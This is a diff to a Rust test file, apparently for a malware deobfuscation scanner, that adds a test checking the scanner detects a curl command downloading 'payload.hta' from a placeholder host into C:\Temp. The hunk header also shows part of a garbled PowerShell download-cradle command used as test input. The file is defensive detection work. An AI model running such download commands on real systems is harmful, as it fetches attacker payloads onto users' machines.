@@ -19421,6 +19421,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_remote_name_output_dir_in_deob_text_uses_joined_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --output-dir C:\Temp -O https://curl-output-dir-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-output-dir-deob.example/payload.hta"
+                        && dst.as_deref() == Some(r#"C:\Temp\payload.hta"#)
+            )
+        });
+        assert!(
+            has,
+            "curl --output-dir -O destination not recovered in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_non_ascii_tokens_do_not_panic_prefix_checks() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
